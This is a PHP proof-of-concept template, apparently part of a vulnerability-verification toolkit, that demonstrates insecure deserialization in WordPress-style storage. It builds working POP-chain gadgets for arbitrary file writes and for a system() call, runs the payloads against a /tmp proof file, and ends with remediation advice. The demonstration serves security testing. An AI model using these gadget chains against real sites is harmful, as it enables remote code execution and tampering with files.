<?php
/**
 * PoC Template: Insecure Deserialization with POP Chain
 * 
 * Vulnerability: Deserializing untrusted data with exploitable gadget chains
 * Common in: WordPress options, transients, user meta storage
 * 
 * Detection: Look for unserialize()/maybe_unserialize() combined with magic methods
 * 
 * Metadata:
 * - Category: {{CATEGORY}}
 * - Severity: {{SEVERITY}}
 * - File: {{FILE}}
 * - Line: {{LINE}}
 */

// VULNERABLE CODE LOCATION
// {{VULNERABLE_CODE}}

echo "=== Insecure Deserialization (POP Chain) PoC ===\n\n";

// Step 1: Define POP chain gadgets
// These classes demonstrate common WordPress patterns that can be chained

class FileOperationGadget {
    private $filename;
    private $content;
    
    public function __construct($file, $data) {
        $this->filename = $file;
        $this->content = $data;
    }
    
    public function __destruct() {
        // Gadget 1: Write to arbitrary file
        if ($this->filename && $this->content) {
            file_put_contents($this->filename, $this->content);
        }
    }
}

class CommandExecutionGadget {
    public $hook_name;
    public $callback;
    public $args;
    
    public function __wakeup() {
        // Gadget 2: Execute callback (simulates WordPress hooks)
        if (is_callable($this->callback)) {
            call_user_func_array($this->callback, $this->args);
        }
    }
}

class PropertyOrientedGadget {
    private $target_object;
    private $property_name;
    private $property_value;
    
    public function __toString() {
        // Gadget 3: Property manipulation
        if ($this->target_object) {
            $this->target_object->{$this->property_name} = $this->property_value;
        }
        return "Gadget triggered";
    }
}

// Step 2: Build POP chain
echo "[*] Building POP chain exploit...\n";

// Chain 1: File write gadget
$file_gadget = new FileOperationGadget(
    '/tmp/zerokit_deserialization_proof.txt',
    'DESERIALIZATION_POP_CHAIN_CONFIRMED - ' . date('Y-m-d H:i:s')
);

// Chain 2: Command execution via system()
$cmd_gadget = new CommandExecutionGadget();
$cmd_gadget->callback = 'system';
$cmd_gadget->args = ['echo "Command via POP chain" >> /tmp/zerokit_deserialization_proof.txt'];

// Step 3: Serialize the malicious objects
$payload_file_write = serialize($file_gadget);
$payload_cmd_exec = serialize($cmd_gadget);

echo "[*] Generated POP chain payloads\n";
echo "    Payload 1 (file write): " . strlen($payload_file_write) . " bytes\n";
echo "    Payload 2 (command exec): " . strlen($payload_cmd_exec) . " bytes\n\n";

// Step 4: Simulate WordPress-style storage/retrieval
// Common patterns:
// - update_option('malicious_settings', $serialized_data)
// - set_transient('cache_key', $serialized_data)
// - update_user_meta($user_id, 'preferences', $serialized_data)

echo "[*] Simulating vulnerable deserialization flow...\n";

// Clean up previous tests
@unlink('/tmp/zerokit_deserialization_proof.txt');

$exploitation_successful = false;

// Test 1: File write gadget
echo "[*] Testing file write gadget...\n";
try {
    $restored = unserialize($payload_file_write);
    unset($restored); // Trigger __destruct
    
    sleep(1); // Allow filesystem sync
    
    if (file_exists('/tmp/zerokit_deserialization_proof.txt')) {
        echo "[✓] File write gadget successful\n";
        $exploitation_successful = true;
    }
} catch (Exception $e) {
    echo "[!] File write gadget error: " . $e->getMessage() . "\n";
}

// Test 2: Command execution gadget
echo "[*] Testing command execution gadget...\n";
try {
    $restored = unserialize($payload_cmd_exec);
    // __wakeup() is automatically called during unserialization
    
    sleep(1);
    
    if (file_exists('/tmp/zerokit_deserialization_proof.txt')) {
        $content = file_get_contents('/tmp/zerokit_deserialization_proof.txt');
        if (strpos($content, 'Command via POP chain') !== false) {
            echo "[✓] Command execution gadget successful\n";
            $exploitation_successful = true;
        }
    }
} catch (Exception $e) {
    echo "[!] Command execution gadget error: " . $e->getMessage() . "\n";
}

// Step 5: Verify exploitation
if ($exploitation_successful && file_exists('/tmp/zerokit_deserialization_proof.txt')) {
    $proof_content = file_get_contents('/tmp/zerokit_deserialization_proof.txt');
    
    echo "\n=== VERIFICATION ===\n";
    echo "[✓] Insecure Deserialization CONFIRMED\n";
    echo "[✓] POP chain gadgets successfully exploited\n";
    echo "[✓] Proof file content:\n";
    echo "    " . str_replace("\n", "\n    ", trim($proof_content)) . "\n\n";
    
    echo "=== ATTACK CHAIN ===\n";
    echo "1. Attacker provides serialized malicious object\n";
    echo "2. Application stores it (options, transients, user meta)\n";
    echo "3. Later retrieval triggers unserialize()\n";
    echo "4. Magic methods (__wakeup, __destruct, __toString) execute\n";
    echo "5. Gadgets chain together for arbitrary code execution\n\n";
    
    echo "=== IMPACT ===\n";
    echo "- Remote Code Execution (RCE)\n";
    echo "- Arbitrary file write/read\n";
    echo "- Privilege escalation\n";
    echo "- Database manipulation\n\n";
    
    echo "=== WORDPRESS-SPECIFIC RISKS ===\n";
    echo "- wp_cache_set/get with object caching\n";
    echo "- update_option/get_option with complex objects\n";
    echo "- Transients API (set_transient/get_transient)\n";
    echo "- User meta storage\n\n";
    
    echo "=== RECOMMENDATION ===\n";
    echo "1. Never unserialize() user-controlled data\n";
    echo "2. Use json_encode()/json_decode() instead\n";
    echo "3. If serialization is required:\n";
    echo "   - Validate class names before unserialization\n";
    echo "   - Use HMAC signatures to prevent tampering\n";
    echo "   - Implement __PHP_Incomplete_Class handler\n";
    echo "4. Audit WordPress functions:\n";
    echo "   - maybe_unserialize()\n";
    echo "   - update_option() with objects\n";
    echo "   - set_transient() with objects\n";
    
    // Cleanup
    @unlink('/tmp/zerokit_deserialization_proof.txt');
    
    exit(0); // SUCCESS
    
} else {
    echo "\n[✗] Deserialization verification failed\n";
    echo "[✗] POP chain gadgets did not execute\n";
    exit(1); // FAILURE
}
?>
